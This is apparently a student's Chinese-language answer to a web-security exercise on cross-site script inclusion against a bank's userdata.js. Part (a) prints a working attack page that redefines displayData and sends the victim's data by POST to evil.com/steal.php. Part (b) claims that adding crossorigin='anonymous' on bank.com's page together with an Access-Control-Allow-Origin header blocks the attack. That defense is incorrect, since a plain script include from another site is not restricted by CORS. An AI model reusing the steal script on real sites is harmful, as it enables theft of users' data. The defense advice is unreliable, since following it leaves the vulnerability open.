# T2
## (a)
`evil.com`的页面可以通过嵌入一个`<script>`标签，指向bank.com的`userdata.js`文件，并重新编写`displayData`函数来获取John Doe的数据。当John Doe登录`bank.com`后，访问`evil.com`，`evil.com`便会加载`bank.com/userdata.js`并执行`displayData`，将数据发送给`evil.com`

```html
<script>
function displayData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://evil.com/steal.php");
    xhr.send(JSON.stringify(data));
}</script>
<script src="//bank.com/userdata.js"> </script>
```

## (b)
可以使用CORS来限制只有`bank.com`域名允许访问`userdata.js`文件，从而防止这种攻击。

将`accountInfo.html`的(*)行修改为：

```html
<script src="//bank.com/userdata.js" crossorigin="anonymous"> </script>
```

这样一来，浏览器将启用CORS。另外，服务器在`userdata.js`文件中添加一个响应头，指定`Access-Control-Allow-Origin`为`bank.com`。因此，只有来自`bank.com`的请求才能访问`userdata.js`文件，当`evil.com`试图访问`userdata.js`时会被浏览器拒绝。